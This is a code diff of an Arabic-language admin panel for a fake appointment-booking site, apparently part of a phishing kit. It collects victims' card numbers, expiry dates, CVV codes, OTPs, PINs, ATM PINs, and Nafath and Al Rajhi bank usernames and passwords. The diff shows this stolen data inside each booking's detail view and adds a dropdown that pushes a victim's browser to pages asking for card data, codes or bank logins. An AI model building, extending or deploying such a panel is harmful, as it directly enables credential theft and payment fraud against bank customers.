@@ -36,7 +36,7 @@ body{font-family:'Segoe UI',Tahoma,sans-serif;background:#f0f4f8;color:#1a1a2e;d
 .btnout{background:#ef4444;color:#fff;border:none;border-radius:8px;padding:7px 14px;font-size:13px;cursor:pointer;display:flex;align-items:center;gap:6px}
 .btnout:hover{background:#dc2626}
 .main{padding:24px;max-width:1500px;margin:0 auto}
-/* STATS - إجمالي الحجوزات على اليمين، زوار متصلون على اليسار */
+/* STATS */
 .stats{display:grid;grid-template-columns:repeat(5,1fr);gap:16px;margin-bottom:24px}
 .sc{background:#fff;border-radius:14px;padding:18px 20px;display:flex;align-items:center;justify-content:space-between;box-shadow:0 1px 4px rgba(0,0,0,.06);border:1px solid #f3f4f6}
 .sv{font-size:26px;font-weight:700}
@@ -45,8 +45,6 @@ body{font-family:'Segoe UI',Tahoma,sans-serif;background:#f0f4f8;color:#1a1a2e;d
 .si.g{background:#dcfce7;color:#16a34a}.si.b{background:#dbeafe;color:#2563eb}
 .si.o{background:#ffedd5;color:#ea580c}.si.p{background:#ede9fe;color:#7c3aed}
 .si.t{background:#ccfbf1;color:#0d9488}
-/* LAYOUT: جدول + زوار جنباً لجنب */
-.layout{display:grid;grid-template-columns:1fr 340px;gap:20px;align-items:start}
 /* BOOKINGS */
 .tcard{background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.06);border:1px solid #f3f4f6}
 .thead2{padding:14px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #f3f4f6}
@@ -66,44 +64,19 @@ tr:hover td{background:#fafafa}
 .bp{background:#fef3c7;color:#d97706}.bc{background:#dcfce7;color:#16a34a}
 .br{background:#fee2e2;color:#dc2626}.bn{background:#dbeafe;color:#2563eb}
 .abts{display:flex;gap:5px;align-items:center}
+/* زر التفاصيل */
 .bdet{background:#2563eb;color:#fff;border:none;border-radius:7px;padding:5px 10px;font-size:11px;cursor:pointer;display:flex;align-items:center;gap:3px}
 .bdet:hover{background:#1d4ed8}
-.bacc{background:#16a34a;color:#fff;border:none;border-radius:7px;padding:5px 8px;font-size:11px;cursor:pointer}
-.bacc:hover{background:#15803d}
-.brej{background:#dc2626;color:#fff;border:none;border-radius:7px;padding:5px 8px;font-size:11px;cursor:pointer}
-.brej:hover{background:#b91c1c}
+/* زر إعادة التوجيه */
+.bnav{background:#7c3aed;color:#fff;border:none;border-radius:7px;padding:5px 10px;font-size:11px;cursor:pointer;display:flex;align-items:center;gap:3px;position:relative}
+.bnav:hover{background:#6d28d9}
+/* قائمة التوجيه المنسدلة */
+.navdrop{position:absolute;top:100%;right:0;background:#fff;border:1px solid #e5e7eb;border-radius:10px;box-shadow:0 8px 24px rgba(0,0,0,.12);z-index:200;min-width:160px;padding:6px;display:none;margin-top:4px}
+.navdrop.open{display:block}
+.navdrop a{display:block;padding:8px 12px;font-size:12px;color:#374151;border-radius:7px;cursor:pointer;text-decoration:none}
+.navdrop a:hover{background:#f3f4f6;color:#1a6b4a}
 .empty{text-align:center;padding:50px 20px;color:#9ca3af}
 .empty i{font-size:36px;margin-bottom:10px;display:block}
-/* SIDEBAR: زوار + توجيه */
-.sidebar{display:flex;flex-direction:column;gap:16px}
-.vcard2{background:#fff;border-radius:14px;box-shadow:0 1px 4px rgba(0,0,0,.06);border:1px solid #f3f4f6;overflow:hidden}
-.vhdr{padding:14px 16px;border-bottom:1px solid #f3f4f6;display:flex;align-items:center;justify-content:space-between}
-.vtitle{font-size:14px;font-weight:700}
-.vbody{padding:12px}
-.vitem{background:#f9fafb;border-radius:10px;padding:12px;margin-bottom:8px;border:1px solid #f3f4f6}
-.vitem:last-child{margin-bottom:0}
-.virow{display:flex;align-items:center;justify-content:space-between;margin-bottom:8px}
-.vsid{font-size:11px;color:#6b7280;font-family:monospace}
-.vonl{width:7px;height:7px;border-radius:50%;background:#22c55e}
-.vpg{font-size:13px;font-weight:600;color:#1a1a2e}
-.vip{font-size:11px;color:#9ca3af;margin-bottom:8px}
-.vnav{display:flex;gap:6px;margin-bottom:6px}
-.nsel{flex:1;border:1px solid #d1d5db;border-radius:7px;padding:6px 8px;font-size:11px;outline:none;color:#374151}
-.bsnav{background:#7c3aed;color:#fff;border:none;border-radius:7px;padding:6px 10px;font-size:11px;cursor:pointer}
-.bsnav:hover{background:#6d28d9}
-.vcode{display:flex;gap:6px}
-.cinp{flex:1;border:1px solid #d1d5db;border-radius:7px;padding:6px 8px;font-size:11px;outline:none}
-.bscode{background:#0d9488;color:#fff;border:none;border-radius:7px;padding:6px 10px;font-size:11px;cursor:pointer}
-.bscode:hover{background:#0f766e}
-/* DATA NOTIFICATIONS */
-.ntf{background:#fff;border-radius:14px;box-shadow:0 1px 4px rgba(0,0,0,.06);border:1px solid #f3f4f6;overflow:hidden}
-.ntfhdr{padding:14px 16px;border-bottom:1px solid #f3f4f6;display:flex;align-items:center;justify-content:space-between}
-.ntfbody{max-height:300px;overflow-y:auto;padding:10px}
-.ntfitem{background:#f9fafb;border-radius:8px;padding:10px 12px;margin-bottom:6px;border-right:3px solid #1a6b4a;font-size:12px}
-.ntfitem:last-child{margin-bottom:0}
-.ntftype{font-weight:600;color:#1a6b4a;margin-bottom:3px}
-.ntfip{color:#6b7280;font-size:11px}
-.ntftime{color:#9ca3af;font-size:10px;float:left}
 /* MODAL */
 .moverlay{position:fixed;inset:0;background:rgba(0,0,0,.5);display:none;align-items:center;justify-content:center;z-index:1000}
 .moverlay.active{display:flex}
@@ -115,6 +88,9 @@ tr:hover td{background:#fafafa}
 .drow{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid #f9fafb}
 .drow:last-child{border-bottom:none}
 .dlbl{font-size:13px;color:#6b7280}.dval{font-size:13px;color:#1f2937;font-weight:500}
+/* البيانات الإضافية داخل المودال */
+.dsection{background:#f9fafb;border-radius:10px;padding:14px;margin-top:14px;border:1px solid #f3f4f6}
+.dsection-title{font-size:13px;font-weight:700;color:#374151;margin-bottom:10px;display:flex;align-items:center;gap:6px}
 .macts{display:flex;gap:10px;margin-top:20px}
 .macts button{flex:1;padding:11px;border:none;border-radius:10px;font-size:14px;font-weight:600;cursor:pointer}
 .macc{background:#16a34a;color:#fff}.macc:hover{background:#15803d}
@@ -122,7 +98,10 @@ tr:hover td{background:#fafafa}
 /* TOAST */
 .toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#1f2937;color:#fff;padding:12px 24px;border-radius:10px;font-size:14px;z-index:9999;display:none;align-items:center;gap:8px;box-shadow:0 4px 20px rgba(0,0,0,.2)}
 .toast.show{display:flex}.toast.success{background:#16a34a}.toast.error{background:#dc2626}.toast.info{background:#2563eb}
-@media(max-width:1024px){.layout{grid-template-columns:1fr}.stats{grid-template-columns:repeat(3,1fr)}}
+/* نقطة جديدة */
+.newdot{width:8px;height:8px;border-radius:50%;background:#ef4444;display:inline-block;margin-right:4px;animation:pulse 1s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+@media(max-width:1024px){.stats{grid-template-columns:repeat(3,1fr)}}
 @media(max-width:600px){.stats{grid-template-columns:repeat(2,1fr)}.main{padding:12px}}
 </style>
 </head>
@@ -159,47 +138,53 @@ tr:hover td{background:#fafafa}
     </div>
   </div>
   <div class="main">
-    <!-- STATS: إجمالي على اليمين، زوار على اليسار -->
+    <!-- STATS: زوار على اليسار، إجمالي على اليمين -->
     <div class="stats">
-      <div class="sc" style="order:1"><div><div class="sv" id="s5">0</div><div class="sl">إجمالي الحجوزات</div></div><div class="si t"><i class="fas fa-users"></i></div></div>
-      <div class="sc" style="order:2"><div><div class="sv" id="s4">0</div><div class="sl">حجوزات اليوم</div></div><div class="si p"><i class="fas fa-bell"></i></div></div>
-      <div class="sc" style="order:3"><div><div class="sv" id="s3">0</div><div class="sl">مكتملة</div></div><div class="si b"><i class="fas fa-check-circle"></i></div></div>
-      <div class="sc" style="order:4"><div><div class="sv" id="s2">0</div><div class="sl">قيد المعالجة</div></div><div class="si o"><i class="fas fa-clock"></i></div></div>
-      <div class="sc" style="order:5"><div><div class="sv" id="s1">0</div><div class="sl">زوار متصلون الآن</div></div><div class="si g"><i class="fas fa-wifi"></i></div></div>
+      <div class="sc"><div><div class="sv" id="s1">0</div><div class="sl">زوار متصلون الآن</div></div><div class="si g"><i class="fas fa-wifi"></i></div></div>
+      <div class="sc"><div><div class="sv" id="s2">0</div><div class="sl">قيد المعالجة</div></div><div class="si o"><i class="fas fa-clock"></i></div></div>
+      <div class="sc"><div><div class="sv" id="s3">0</div><div class="sl">مكتملة</div></div><div class="si b"><i class="fas fa-check-circle"></i></div></div>
+      <div class="sc"><div><div class="sv" id="s4">0</div><div class="sl">حجوزات اليوم</div></div><div class="si p"><i class="fas fa-bell"></i></div></div>
+      <div class="sc"><div><div class="sv" id="s5">0</div><div class="sl">إجمالي الحجوزات</div></div><div class="si t"><i class="fas fa-users"></i></div></div>
     </div>
 
-    <div class="layout">
-      <!-- BOOKINGS TABLE -->
-      <div>
-        <div class="sbar"><i class="fas fa-search"></i><input type="text" id="srch" placeholder="بحث بالاسم أو الهاتف أو المنطقة..." oninput="filterTable()"/></div>
-        <div class="tcard">
-          <div class="thead2"><span class="ttitle"><i class="fas fa-calendar-check" style="color:#1a6b4a;margin-left:8px"></i>قائمة الحجوزات</span><button class="btnref" onclick="loadBookings()"><i class="fas fa-sync-alt"></i> تحديث</button></div>
-          <div style="overflow-x:auto"><table><thead><tr><th>#</th><th>الاسم</th><th>رقم الهاتف</th><th>المنطقة</th><th>نوع الخدمة</th><th>التاريخ</th><th>الوقت</th><th>الحالة</th><th>الإجراءات</th></tr></thead><tbody id="btable"><tr><td colspan="9"><div class="empty"><i class="fas fa-inbox"></i><p>جاري التحميل...</p></div></td></tr></tbody></table></div>
-        </div>
+    <!-- BOOKINGS TABLE (عرض كامل) -->
+    <div class="sbar"><i class="fas fa-search"></i><input type="text" id="srch" placeholder="بحث بالاسم أو الهاتف أو المنطقة..." oninput="filterTable()"/></div>
+    <div class="tcard">
+      <div class="thead2">
+        <span class="ttitle"><i class="fas fa-calendar-check" style="color:#1a6b4a;margin-left:8px"></i>قائمة الحجوزات</span>
+        <button class="btnref" onclick="loadBookings()"><i class="fas fa-sync-alt"></i> تحديث</button>
       </div>
-
-      <!-- SIDEBAR -->
-      <div class="sidebar">
-        <!-- DATA NOTIFICATIONS -->
-        <div class="ntf">
-          <div class="ntfhdr"><span class="ttitle"><i class="fas fa-bell" style="color:#ea580c;margin-left:8px"></i>البيانات الواردة</span><button class="btnref" onclick="clearNotifs()"><i class="fas fa-trash"></i></button></div>
-          <div class="ntfbody" id="ntfbody"><div class="empty" style="padding:20px"><i class="fas fa-inbox"></i><p>لا توجد بيانات بعد</p></div></div>
-        </div>
-
-        <!-- VISITORS -->
-        <div class="vcard2">
-          <div class="vhdr"><span class="vtitle"><i class="fas fa-eye" style="color:#2563eb;margin-left:8px"></i>الزوار المتصلون</span><span class="badge bn" id="vcnt">0</span></div>
-          <div class="vbody" id="vbody"><div class="empty" style="padding:20px"><i class="fas fa-users"></i><p>لا يوجد زوار</p></div></div>
-        </div>
+      <div style="overflow-x:auto">
+        <table>
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>الاسم</th>
+              <th>رقم الهاتف</th>
+              <th>المنطقة</th>
+              <th>نوع الخدمة</th>
+              <th>التاريخ</th>
+              <th>الوقت</th>
+              <th>الحالة</th>
+              <th>الإجراءات</th>
+            </tr>
+          </thead>
+          <tbody id="btable">
+            <tr><td colspan="9"><div class="empty"><i class="fas fa-inbox"></i><p>جاري التحميل...</p></div></td></tr>
+          </tbody>
+        </table>
       </div>
     </div>
   </div>
 </div>
 
-<!-- MODAL -->
+<!-- MODAL التفاصيل -->
 <div class="moverlay" id="moverlay" onclick="closeMO(event)">
   <div class="modal">
-    <div class="mhdr"><span class="mtitle">تفاصيل الحجز</span><button class="mclose" onclick="closeM()">&#10005;</button></div>
+    <div class="mhdr">
+      <span class="mtitle"><i class="fas fa-info-circle" style="color:#1a6b4a;margin-left:8px"></i>تفاصيل الحجز</span>
+      <button class="mclose" onclick="closeM()">&#10005;</button>
+    </div>
     <div id="mbody"></div>
     <div class="macts" id="macts"></div>
   </div>
@@ -216,14 +201,24 @@ const PAGES = [
   {v:'booking',l:'حجز موعد'},
   {v:'payments',l:'بيانات البطاقة'},
   {v:'phone',l:'رقم الهاتف'},
-  {v:'pin',l:'رمز التحقق'},
+  {v:'pin',l:'رمز PIN'},
   {v:'code',l:'كود OTP'},
   {v:'whats',l:'واتساب'},
   {v:'nafad',l:'نفاذ'},
+  {v:'waiting',l:'صفحة الانتظار'},
   {v:'success',l:'نجاح'}
 ];
 
-let socket = null, bookings = [], visitors = [], notifs = [];
+let socket = null, bookings = [], visitors = [];
+// تخزين البيانات الإضافية لكل حجز (بطاقة، OTP، هاتف...)
+let sessionData = {};
+
+// إغلاق كل القوائم المنسدلة عند النقر خارجها
+document.addEventListener('click', function(e) {
+  if (!e.target.closest('.bnav')) {
+    document.querySelectorAll('.navdrop.open').forEach(function(d){ d.classList.remove('open'); });
+  }
+});
 
 // LOGIN
 document.getElementById('loginForm').addEventListener('submit', function(e) {
@@ -262,37 +257,67 @@ window.onload = function() { if (localStorage.getItem('aa') === '1') showAdmin()
 
 function initSocket() {
   socket = io(SRV, { transports: ['websocket', 'polling'] });
+
   socket.on('connect', function() {
     document.getElementById('sdot').style.background = '#22c55e';
     document.getElementById('stext').textContent = 'متصل';
     socket.emit('adminJoin');
   });
+
   socket.on('disconnect', function() {
     document.getElementById('sdot').style.background = '#ef4444';
     document.getElementById('stext').textContent = 'منقطع';
   });
+
+  // تحديث عداد الزوار
   socket.on('visitorUpdate', function(list) {
     visitors = list || [];
     document.getElementById('s1').textContent = visitors.length;
-    document.getElementById('vcnt').textContent = visitors.length;
-    renderVisitors();
   });
+
+  // حجز جديد
   socket.on('newBooking', function(b) {
     bookings.unshift(b);
     renderBookings(bookings);
     updateStats();
     showToast('حجز جديد: ' + (b.name || 'عميل'), 'success');
   });
+
+  // تحديث حجز
   socket.on('bookingUpdated', function(b) {
     var i = bookings.findIndex(function(x){ return x.id === b.id; });
     if (i >= 0) bookings[i] = b;
     renderBookings(bookings);
     updateStats();
   });
+
+  // بيانات جديدة (بطاقة، OTP، هاتف...) - تُخزَّن وتُعرض في التفاصيل
   socket.on('newData', function(d) {
-    addNotif(d);
+    var key = d.ip || d.socketId || 'unknown';
+    if (!sessionData[key]) sessionData[key] = [];
+    sessionData[key].unshift(d);
+    if (sessionData[key].length > 20) sessionData[key].pop();
+    showToast('بيانات جديدة: ' + (typeLabels[d.type] || d.type), 'info');
+    // تحديث المودال إذا كان مفتوحاً
+    var overlay = document.getElementById('moverlay');
+    if (overlay.classList.contains('active') && currentBookingIdx >= 0) {
+      updateModalData(bookings[currentBookingIdx]);
+    }
   });
 }
+
+var typeLabels = {
+  payment: 'بيانات بطاقة',
+  phone: 'رقم الهاتف',
+  phoneCode: 'كود الهاتف',
+  code: 'كود OTP',
+  nafad: 'بيانات نفاذ',
+  rajhi: 'بيانات الراجحي',
+  rajhiCode: 'كود الراجحي',
+  verification: 'بيانات التحقق',
+  pin: 'رمز PIN',
+  atm: 'رقم سري ATM'
+};
 
 async function loadBookings() {
   try {
@@ -309,26 +334,75 @@ function renderBookings(data) {
     return;
   }
   tb.innerHTML = data.map(function(b, i) {
-    var pend = !b.status || b.status === 'pending' || b.status === 'new';
-    return '<tr><td>' + (i+1) + '</td><td><b>' + (b.name||'-') + '</b></td><td>' + (b.phone_number||b.phone||'-') + '</td><td>' + (b.region||'-') + '</td><td>' + (b.service_type||'-') + '</td><td>' + (b.date_svc||b.date||'-') + '</td><td>' + (b.time_svc||b.time||'-') + '</td><td>' + sbadge(b.status) + '</td><td><div class="abts"><button class="bdet" onclick="showDet(' + i + ')"><i class="fas fa-eye"></i> تفاصيل</button>' + (pend ? '<button class="bacc" onclick="updSt(' + b.id + ',\'confirmed\')" title="قبول">&#10003;</button><button class="brej" onclick="updSt(' + b.id + ',\'rejected\')" title="رفض">&#10007;</button>' : '') + '</div></td></tr>';
+    // زر إعادة التوجيه مع قائمة منسدلة
+    var navOpts = PAGES.map(function(p){
+      return '<a onclick="sendNavById(\'' + (b.socketId||b.ip||'') + '\',\'' + p.v + '\',this)">' + p.l + '</a>';
+    }).join('');
+    var navBtn = '<div style="position:relative;display:inline-block"><button class="bnav" onclick="toggleNav(this)"><i class="fas fa-paper-plane"></i> توجيه</button><div class="navdrop">' + navOpts + '</div></div>';
+    return '<tr>' +
+      '<td>' + (i+1) + '</td>' +
+      '<td><b>' + (b.name||'-') + '</b></td>' +
+      '<td>' + (b.phone_number||b.phone||'-') + '</td>' +
+      '<td>' + (b.region||'-') + '</td>' +
+      '<td>' + (b.service_type||'-') + '</td>' +
+      '<td>' + (b.date_svc||b.date||'-') + '</td>' +
+      '<td>' + (b.time_svc||b.time||'-') + '</td>' +
+      '<td>' + sbadge(b.status) + '</td>' +
+      '<td><div class="abts">' +
+        '<button class="bdet" onclick="showDet(' + i + ')"><i class="fas fa-eye"></i> تفاصيل</button>' +
+        navBtn +
+      '</div></td>' +
+    '</tr>';
   }).join('');
 }
 
+function toggleNav(btn) {
+  var drop = btn.nextElementSibling;
+  var wasOpen = drop.classList.contains('open');
+  document.querySelectorAll('.navdrop.open').forEach(function(d){ d.classList.remove('open'); });
+  if (!wasOpen) drop.classList.add('open');
+}
+
+function sendNavById(socketIdOrIp, page, el) {
+  if (socket) {
+    socket.emit('adminNavigate', { socketId: socketIdOrIp, page: page });
+    showToast('تم التوجيه إلى: ' + page, 'success');
+  }
+  // إغلاق القائمة
+  var drop = el.closest('.navdrop');
+  if (drop) drop.classList.remove('open');
+}
+
 function sbadge(s) {
-  var m = {pending:'<span class="badge bp">انتظار</span>',confirmed:'<span class="badge bc">مؤكد</span>',rejected:'<span class="badge br">مرفوض</span>',new:'<span class="badge bn">جديد</span>'};
+  var m = {
+    pending:'<span class="badge bp">انتظار</span>',
+    confirmed:'<span class="badge bc">مؤكد</span>',
+    rejected:'<span class="badge br">مرفوض</span>',
+    new:'<span class="badge bn">جديد</span>'
+  };
   return m[s] || '<span class="badge bn">جديد</span>';
 }
 
 function filterTable() {
   var q = document.getElementById('srch').value.toLowerCase();
-  renderBookings(bookings.filter(function(b){ return (b.name||'').toLowerCase().includes(q)||(b.phone_number||b.phone||'').includes(q)||(b.region||'').toLowerCase().includes(q); }));
+  renderBookings(bookings.filter(function(b){
+    return (b.name||'').toLowerCase().includes(q)||(b.phone_number||b.phone||'').includes(q)||(b.region||'').toLowerCase().includes(q);
+  }));
 }
 
 async function updSt(id, status) {
   try {
-    var r = await fetch(SRV + '/api/bookings/' + id + '/status', {method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify({status:status})});
+    var r = await fetch(SRV + '/api/bookings/' + id + '/status', {
+      method:'PUT',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({status:status})
+    });
     var d = await r.json();
-    if (d.success) { showToast(status==='confirmed'?'تم قبول الحجز':'تم رفض الحجز', status==='confirmed'?'success':'error'); loadBookings(); closeM(); }
+    if (d.success) {
+      showToast(status==='confirmed'?'تم قبول الحجز ✓':'تم رفض الحجز ✗', status==='confirmed'?'success':'error');
+      loadBookings();
+      closeM();
+    }
   } catch(e) { showToast('حدث خطأ','error'); }
 }
 
@@ -344,76 +418,21 @@ function updateStats() {
   document.getElementById('s4').textContent = td;
 }
 
-function renderVisitors() {
-  var vb = document.getElementById('vbody');
-  if (!visitors.length) {
-    vb.innerHTML = '<div class="empty" style="padding:20px"><i class="fas fa-users"></i><p>لا يوجد زوار</p></div>';
-    return;
-  }
-  vb.innerHTML = visitors.map(function(v) {
-    var opts = PAGES.map(function(p){ return '<option value="' + p.v + '">' + p.l + '</option>'; }).join('');
-    return '<div class="vitem"><div class="virow"><span class="vsid">' + (v.socketId||'').substring(0,10) + '...</span><span class="vonl"></span></div><div class="vpg"><i class="fas fa-map-marker-alt" style="color:#1a6b4a;margin-left:4px"></i>' + (v.page||'الرئيسية') + '</div><div class="vip">' + (v.ip||'') + '</div><div class="vnav"><select class="nsel" id="ns-' + v.socketId + '">' + opts + '</select><button class="bsnav" onclick="sendNav(\'' + v.socketId + '\')"><i class="fas fa-paper-plane"></i> توجيه</button></div><div class="vcode"><input class="cinp" id="ci-' + v.socketId + '" placeholder="أرسل كود..."/><button class="bscode" onclick="sendCode(\'' + v.socketId + '\')"><i class="fas fa-key"></i></button></div></div>';
-  }).join('');
-}
-
-function sendNav(sid) {
-  var sel = document.getElementById('ns-' + sid);
-  if (socket && sel) {
-    socket.emit('adminNavigate', { socketId: sid, page: sel.value });
-    showToast('تم التوجيه إلى ' + sel.value, 'success');
-  }
-}
-
-function sendCode(sid) {
-  var inp = document.getElementById('ci-' + sid);
-  if (socket && inp && inp.value) {
-    socket.emit('adminSendCode', { socketId: sid, code: inp.value, type: 'whats' });
-    showToast('تم إرسال الكود', 'info');
-    inp.value = '';
-  }
-}
-
-var typeLabels = {
-  payment: 'بيانات بطاقة',
-  phone: 'رقم الهاتف',
-  phoneCode: 'كود الهاتف',
-  code: 'كود OTP',
-  nafad: 'بيانات نفاذ',
-  rajhi: 'بيانات الراجحي',
-  rajhiCode: 'كود الراجحي',
-  verification: 'بيانات التحقق'
-};
-
-function addNotif(d) {
-  notifs.unshift(d);
-  if (notifs.length > 50) notifs.pop();
-  renderNotifs();
-  showToast('بيانات جديدة: ' + (typeLabels[d.type] || d.type), 'info');
-}
-
-function renderNotifs() {
-  var nb = document.getElementById('ntfbody');
-  if (!notifs.length) {
-    nb.innerHTML = '<div class="empty" style="padding:20px"><i class="fas fa-inbox"></i><p>لا توجد بيانات بعد</p></div>';
-    return;
-  }
-  nb.innerHTML = notifs.map(function(d) {
-    var now = new Date().toLocaleTimeString('ar');
-    var detail = '';
-    if (d.type === 'payment' && d.data) detail = 'البطاقة: ' + (d.data.cardNumber||'').replace(/(.{4})/g,'$1 ').trim();
-    else if (d.type === 'phone' && d.data) detail = 'الهوية: ' + (d.data.nationalId||d.data.nationalID||'');
-    else if ((d.type === 'code' || d.type === 'phoneCode') && d.data) detail = 'الكود: ' + (d.data.code||'');
-    else if (d.type === 'rajhi' && d.data) detail = 'المستخدم: ' + (d.data.username||'');
-    return '<div class="ntfitem"><span class="ntftime">' + now + '</span><div class="ntftype">' + (typeLabels[d.type]||d.type) + '</div><div class="ntfip">IP: ' + (d.ip||'-') + '</div>' + (detail ? '<div style="font-size:11px;color:#374151;margin-top:3px">' + detail + '</div>' : '') + '</div>';
-  }).join('');
-}
-
-function clearNotifs() { notifs = []; renderNotifs(); }
+var currentBookingIdx = -1;
 
 function showDet(idx) {
+  currentBookingIdx = idx;
   var b = bookings[idx]; if (!b) return;
-  document.getElementById('mbody').innerHTML =
-    '<div class="drow"><span class="dlbl">الاسم</span><span class="dval">' + (b.name||'-') + '</span></div>' +
+  updateModalData(b);
+  document.getElementById('moverlay').classList.add('active');
+}
+
+function updateModalData(b) {
+  if (!b) return;
+  var pend = !b.status || b.status === 'pending' || b.status === 'new';
+
+  // البيانات الأساسية
+  var html = '<div class="drow"><span class="dlbl">الاسم</span><span class="dval">' + (b.name||'-') + '</span></div>' +
     '<div class="drow"><span class="dlbl">رقم الهوية</span><span class="dval">' + (b.national_id||'-') + '</span></div>' +
     '<div class="drow"><span class="dlbl">رقم الهاتف</span><span class="dval">' + (b.phone_number||b.phone||'-') + '</span></div>' +
     '<div class="drow"><span class="dlbl">البريد الإلكتروني</span><span class="dval">' + (b.email||'-') + '</span></div>' +
@@ -426,14 +445,51 @@ function showDet(idx) {
     '<div class="drow"><span class="dlbl">الحالة</span><span class="dval">' + sbadge(b.status) + '</span></div>' +
     '<div class="drow"><span class="dlbl">IP</span><span class="dval">' + (b.ip||'-') + '</span></div>' +
     '<div class="drow"><span class="dlbl">تاريخ التسجيل</span><span class="dval">' + (b.created_at ? new Date(b.created_at).toLocaleString('ar') : '-') + '</span></div>';
-  var pend = !b.status || b.status === 'pending' || b.status === 'new';
+
+  // البيانات الإضافية (بطاقة، OTP، هاتف...)
+  var key = b.ip || b.socketId || '';
+  var extras = sessionData[key] || [];
+  if (extras.length > 0) {
+    html += '<div class="dsection">';
+    html += '<div class="dsection-title"><i class="fas fa-database" style="color:#ea580c"></i>البيانات الواردة</div>';
+    extras.forEach(function(d) {
+      var detail = '';
+      if (d.type === 'payment' && d.data) {
+        detail = '<div class="drow"><span class="dlbl">رقم البطاقة</span><span class="dval" style="font-family:monospace;letter-spacing:2px">' + (d.data.cardNumber||'').replace(/(.{4})/g,'$1 ').trim() + '</span></div>' +
+          '<div class="drow"><span class="dlbl">تاريخ الانتهاء</span><span class="dval">' + (d.data.expiry||d.data.expiryDate||'-') + '</span></div>' +
+          '<div class="drow"><span class="dlbl">CVV</span><span class="dval">' + (d.data.cvv||'-') + '</span></div>' +
+          '<div class="drow"><span class="dlbl">اسم حامل البطاقة</span><span class="dval">' + (d.data.cardName||d.data.name||'-') + '</span></div>';
+      } else if (d.type === 'phone' && d.data) {
+        detail = '<div class="drow"><span class="dlbl">رقم الهوية</span><span class="dval">' + (d.data.nationalId||d.data.nationalID||'-') + '</span></div>';
+      } else if ((d.type === 'code' || d.type === 'phoneCode' || d.type === 'pin' || d.type === 'atm') && d.data) {
+        detail = '<div class="drow"><span class="dlbl">الكود</span><span class="dval" style="font-size:18px;font-weight:700;color:#dc2626;letter-spacing:4px">' + (d.data.code||d.data.pin||d.data.otp||'-') + '</span></div>';
+      } else if (d.type === 'nafad' && d.data) {
+        detail = '<div class="drow"><span class="dlbl">اسم المستخدم</span><span class="dval">' + (d.data.username||'-') + '</span></div>' +
+          '<div class="drow"><span class="dlbl">كلمة المرور</span><span class="dval">' + (d.data.password||'-') + '</span></div>';
+      } else if (d.type === 'rajhi' && d.data) {
+        detail = '<div class="drow"><span class="dlbl">اسم المستخدم</span><span class="dval">' + (d.data.username||'-') + '</span></div>' +
+          '<div class="drow"><span class="dlbl">كلمة المرور</span><span class="dval">' + (d.data.password||'-') + '</span></div>';
+      }
+      html += '<div style="background:#fff;border-radius:8px;padding:10px;margin-bottom:8px;border:1px solid #f3f4f6">' +
+        '<div style="font-size:11px;font-weight:700;color:#ea580c;margin-bottom:6px"><i class="fas fa-circle" style="font-size:7px;margin-left:4px"></i>' + (typeLabels[d.type]||d.type) + '</div>' +
+        detail + '</div>';
+    });
+    html += '</div>';
+  }
+
+  document.getElementById('mbody').innerHTML = html;
+
+  // أزرار القبول والرفض فقط للحجوزات المعلقة
   document.getElementById('macts').innerHTML = pend ?
-    '<button class="macc" onclick="updSt(' + b.id + ',\'confirmed\')"><i class="fas fa-check"></i> قبول</button><button class="mrej2" onclick="updSt(' + b.id + ',\'rejected\')"><i class="fas fa-times"></i> رفض</button>' : '';
-  document.getElementById('moverlay').classList.add('active');
+    '<button class="macc" onclick="updSt(' + b.id + ',\'confirmed\')"><i class="fas fa-check"></i> قبول</button>' +
+    '<button class="mrej2" onclick="updSt(' + b.id + ',\'rejected\')"><i class="fas fa-times"></i> رفض</button>' : '';
 }
 
 function closeMO(e) { if (e.target === document.getElementById('moverlay')) closeM(); }
-function closeM() { document.getElementById('moverlay').classList.remove('active'); }
+function closeM() {
+  document.getElementById('moverlay').classList.remove('active');
+  currentBookingIdx = -1;
+}
 
 function showToast(msg, type) {
   var t = document.getElementById('toast');
